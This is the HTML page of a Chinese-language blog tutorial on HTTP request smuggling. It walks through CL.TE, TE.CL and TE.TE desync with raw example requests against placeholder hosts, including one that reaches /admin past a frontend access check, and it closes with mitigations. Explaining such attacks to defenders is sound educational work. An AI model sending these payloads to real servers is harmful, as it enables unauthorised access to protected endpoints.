@@ -1,0 +1,401 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.3/css/all.min.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css">
+
+<script class="next-config" data-name="main" type="application/json">{&quot;hostname&quot;:&quot;arronhong.github.io&quot;,&quot;root&quot;:&quot;&#x2F;&quot;,&quot;images&quot;:&quot;&#x2F;images&quot;,&quot;scheme&quot;:&quot;Mist&quot;,&quot;version&quot;:&quot;8.4.0&quot;,&quot;exturl&quot;:false,&quot;sidebar&quot;:{&quot;position&quot;:&quot;left&quot;,&quot;display&quot;:&quot;post&quot;,&quot;padding&quot;:18,&quot;offset&quot;:12},&quot;copycode&quot;:false,&quot;bookmark&quot;:{&quot;enable&quot;:false,&quot;color&quot;:&quot;#222&quot;,&quot;save&quot;:&quot;auto&quot;},&quot;fancybox&quot;:false,&quot;mediumzoom&quot;:false,&quot;lazyload&quot;:false,&quot;pangu&quot;:false,&quot;comments&quot;:{&quot;style&quot;:&quot;tabs&quot;,&quot;active&quot;:null,&quot;storage&quot;:true,&quot;lazyload&quot;:false,&quot;nav&quot;:null},&quot;motion&quot;:{&quot;enable&quot;:true,&quot;async&quot;:false,&quot;transition&quot;:{&quot;post_block&quot;:&quot;fadeIn&quot;,&quot;post_header&quot;:&quot;fadeInDown&quot;,&quot;post_body&quot;:&quot;fadeInDown&quot;,&quot;coll_header&quot;:&quot;fadeInLeft&quot;,&quot;sidebar&quot;:&quot;fadeInUp&quot;}},&quot;prism&quot;:false,&quot;i18n&quot;:{&quot;placeholder&quot;:&quot;Searching...&quot;,&quot;empty&quot;:&quot;We didn&#39;t find any results for the search: ${query}&quot;,&quot;hits_time&quot;:&quot;${hits} results found in ${time} ms&quot;,&quot;hits&quot;:&quot;${hits} results found&quot;},&quot;path&quot;:&quot;&#x2F;search.xml&quot;,&quot;localsearch&quot;:{&quot;enable&quot;:true,&quot;trigger&quot;:&quot;auto&quot;,&quot;top_n_per_article&quot;:5,&quot;unescape&quot;:false,&quot;preload&quot;:false}}</script>
+<meta name="description" content="HTTP Request Smuggling 現今的Web應用程式架構通常由frontend server(load balancer)將http request轉給backend server，且front-end server與backend server間會使用persistent connection來減少反覆建立tcp開銷(3 way handshake、slow start)。HTTP">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTTP Request Smuggling">
+<meta property="og:url" content="https://arronhong.github.io/2021/05/22/HTTP%20Request%20Smuggling/index.html">
+<meta property="og:site_name" content="arronhong.github.io">
+<meta property="og:description" content="HTTP Request Smuggling 現今的Web應用程式架構通常由frontend server(load balancer)將http request轉給backend server，且front-end server與backend server間會使用persistent connection來減少反覆建立tcp開銷(3 way handshake、slow start)。HTTP">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.imgur.com/oNHq051.png">
+<meta property="article:published_time" content="2021-05-22T15:46:41.000Z">
+<meta property="article:modified_time" content="2021-05-30T09:01:49.311Z">
+<meta property="article:author" content="Arron Hong">
+<meta property="article:tag" content="http">
+<meta property="article:tag" content="security">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.imgur.com/oNHq051.png">
+
+
+<link rel="canonical" href="https://arronhong.github.io/2021/05/22/HTTP%20Request%20Smuggling/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{&quot;sidebar&quot;:&quot;&quot;,&quot;isHome&quot;:false,&quot;isPost&quot;:true,&quot;lang&quot;:&quot;en&quot;,&quot;comments&quot;:true,&quot;permalink&quot;:&quot;https:&#x2F;&#x2F;arronhong.github.io&#x2F;2021&#x2F;05&#x2F;22&#x2F;HTTP%20Request%20Smuggling&#x2F;&quot;,&quot;path&quot;:&quot;2021&#x2F;05&#x2F;22&#x2F;HTTP Request Smuggling&#x2F;&quot;,&quot;title&quot;:&quot;HTTP Request Smuggling&quot;}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">&quot;&quot;</script>
+<title>HTTP Request Smuggling | arronhong.github.io</title><script src="/js/config.js"></script>
+  
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">arronhong.github.io</h1>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-text">HTTP Request Smuggling</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#HTTP1-x-%E5%88%A4%E6%96%B7message-body%E7%9A%84%E6%96%B9%E5%BC%8F"><span class="nav-text">HTTP1.x 判斷message body的方式</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Content-Length"><span class="nav-text">Content-Length</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Transfer-Encoding"><span class="nav-text">Transfer-Encoding</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E5%9F%B7%E8%A1%8CHTTP-smuggling"><span class="nav-text">如何執行HTTP smuggling</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#CL-TE-vulnerabilities"><span class="nav-text">CL.TE vulnerabilities</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#TE-CL-vulnerabilities"><span class="nav-text">TE.CL vulnerabilities</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#TE-TE-behavior-obfuscating-the-TE-header"><span class="nav-text">TE.TE behavior: obfuscating the TE header</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%94%A8HTTP-smuggling%E7%B9%9E%E9%81%8Efrontend-server%E7%9A%84%E5%AD%98%E5%8F%96%E6%8E%A7%E5%88%B6"><span class="nav-text">用HTTP smuggling繞過frontend server的存取控制</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E9%81%BF%E5%85%8Dhttp-smuggling"><span class="nav-text">如何避免http smuggling</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reference"><span class="nav-text">Reference</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Arron Hong</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">3</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/arronhong" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;arronhong" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:arronhong216@gmail.com" title="E-Mail → mailto:arronhong216@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.linkedin.com/in/arron-hong-bab57b17b/" title="Linkedin → https:&#x2F;&#x2F;www.linkedin.com&#x2F;in&#x2F;arron-hong-bab57b17b&#x2F;" rel="noopener" target="_blank"><i class="fab fa-linkedin fa-fw"></i>Linkedin</a>
+      </span>
+  </div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://arronhong.github.io/2021/05/22/HTTP%20Request%20Smuggling/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Arron Hong">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="arronhong.github.io">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          HTTP Request Smuggling
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2021-05-22 15:46:41" itemprop="dateCreated datePublished" datetime="2021-05-22T15:46:41+00:00">2021-05-22</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">Edited on</span>
+        <time title="Modified: 2021-05-30 09:01:49" itemprop="dateModified" datetime="2021-05-30T09:01:49+00:00">2021-05-30</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/http-security/" itemprop="url" rel="index"><span itemprop="name">http security</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1>HTTP Request Smuggling</h1>
+<p>現今的Web應用程式架構通常由frontend server(load balancer)將http request轉給backend server，且front-end server與backend server間會使用persistent connection來減少反覆建立tcp開銷(3 way handshake、slow start)。HTTP smuggling透過frontend server與backend server對http body長度判斷依據不同，將干擾的資訊prepend在下個request達成攻擊。</p>
+<p><img src="https://i.imgur.com/oNHq051.png" alt=""></p>
+<h2 id="HTTP1-x-判斷message-body的方式">HTTP1.x 判斷message body的方式</h2>
+<h3 id="Content-Length">Content-Length</h3>
+<p>當client與server用同一個tcp連線來傳送多個http request時，要如何知道http的結尾？透過Content-Length header來聲明message body的長度</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /search HTTP/1.1</span><br><span class="line">Host: normal-website.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 11</span><br><span class="line"></span><br><span class="line">q=smuggling</span><br></pre></td></tr></table></figure>
+<h3 id="Transfer-Encoding">Transfer-Encoding</h3>
+<p>因為header必須要送到，因此當app要動態的產生message body而沒辦法預先知道message body長度時就沒辦法用Content-Length。Transfer-Encoding header聲明message body會透過將message切成多個chunks傳送，每個chunk的開頭是chunk size(十六進制表示)接著CRLF，再接著chunk content，收到chunk size 0時表示message body結束</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST /search HTTP/1.1</span><br><span class="line">Host: normal-website.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">b</span><br><span class="line">q=smuggling</span><br><span class="line">0</span><br></pre></td></tr></table></figure>
+<h2 id="如何執行HTTP-smuggling">如何執行HTTP smuggling</h2>
+<p>雖然rfc有規範當同時出現Content-Length與Transfer-Encoding時，應該要採用Transfer-Encoding，但現實世界卻不一定會是這樣，像是有些server不支援TE。而當request同時帶有CL與TE且frontend server與backend server對body邊界的認定不同時，就可能產生弱點</p>
+<h3 id="CL-TE-vulnerabilities">CL.TE vulnerabilities</h3>
+<p>frontend server看CL，backend server看TE</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 6</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">G</span><br></pre></td></tr></table></figure>
+<p>frontend server因為看CL，所以會把整包轉給backend server，但backend server看TE，因此只讀到chunk size 0就認為這次request結束並回response，而剩下的message(<code>G</code>)，backend server會認為是下個http request而先buffer住直到剩下的header到</p>
+<p>下個request就會像是以下範例，因不認得GPOST這個method而得到錯誤</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GPOST / HTTP/1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br></pre></td></tr></table></figure>
+<h3 id="TE-CL-vulnerabilities"><a target="_blank" rel="noopener" href="http://TE.CL">TE.CL</a> vulnerabilities</h3>
+<p>frontend server看TE，backend server看CL</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">5c</span><br><span class="line">GPOST / HTTP/1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 15</span><br><span class="line"></span><br><span class="line">x=1</span><br><span class="line">0</span><br></pre></td></tr></table></figure>
+<p>frontend server因為看TE，所以會把整包轉給backend server，但backend server看CL，因此只讀到第一行(5c跟CRLF共4個bytes)就認為這次request結束並回response，而剩下的message，backend server會認為是下個http request而先buffer住直到剩下的header到</p>
+<p>下個request就會像是以下範例，因不認得GPOST這個method而得到錯誤</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GPOST / HTTP/1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 15</span><br><span class="line"></span><br><span class="line">x=1</span><br><span class="line">0POST / HTTP/1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br></pre></td></tr></table></figure>
+<h3 id="TE-TE-behavior-obfuscating-the-TE-header">TE.TE behavior: obfuscating the TE header</h3>
+<p>frontend server與backend server都支援處理TE，藉由帶入錯誤的TE來混淆，而frontend server與backend server對混淆的TE處理方式不同時，像是其中一個server被混淆而去看CL時，就形成上述的兩種情況之一</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: your-lab-id.web-security-academy.net</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Transfer-encoding: cow</span><br><span class="line"></span><br><span class="line">5c</span><br><span class="line">GPOST / HTTP/1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 15</span><br><span class="line"></span><br><span class="line">x=1</span><br></pre></td></tr></table></figure>
+<h2 id="用HTTP-smuggling繞過frontend-server的存取控制">用HTTP smuggling繞過frontend server的存取控制</h2>
+<p>這裡舉個比較真實的例子。有些應用程式會在frontend server做存取控制，像是限制只有有權限的使用者才能存取特定endpoint，frontend server只轉有權限的使用者的request給backend server，backend server則完全信任fronent server bypass後的request，因此backend server不做任何權限驗證</p>
+<p>假設攻擊者只能存取<code>/home</code>而不能存取<code>/admin</code>，攻擊者藉由http smuggling方法，讓frontend server看到兩次存取<code>/home</code>的request，backend server看到一次<code>/home</code>與一次<code>/admin</code>的request，而第二次request繞過frontend server的限制存取受限的資源</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /home HTTP/1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 62</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /admin HTTP/1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Foo: xGET /home HTTP/1.1</span><br><span class="line">Host: vulnerable-website.com</span><br></pre></td></tr></table></figure>
+<h2 id="如何避免http-smuggling">如何避免http smuggling</h2>
+<ul>
+<li>backend server不使用persistent connection，因此每個request都是不同的connection</li>
+<li>backend server使用http2，http2使用不同於http1.x的封包格式</li>
+<li>frontend server與backend server使用相同的方式來判定message body的長度</li>
+</ul>
+<h2 id="Reference">Reference</h2>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling">HTTP request smuggling</a></li>
+<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling/exploiting">Exploiting HTTP request smuggling vulnerabilities<br>
+</a></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/http/" rel="tag"># http</a>
+              <a href="/tags/security/" rel="tag"># security</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/05/17/TCP%20Backlog/" rel="prev" title="TCP Backlog">
+                  <i class="fa fa-chevron-left"></i> TCP Backlog
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2021/05/25/Introduction%20to%20Kafka/" rel="next" title="Introduction to Kafka">
+                  Introduction to Kafka <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+<script src="/js/comments.js"></script>
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-rocket"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Arron Hong</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/mist/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
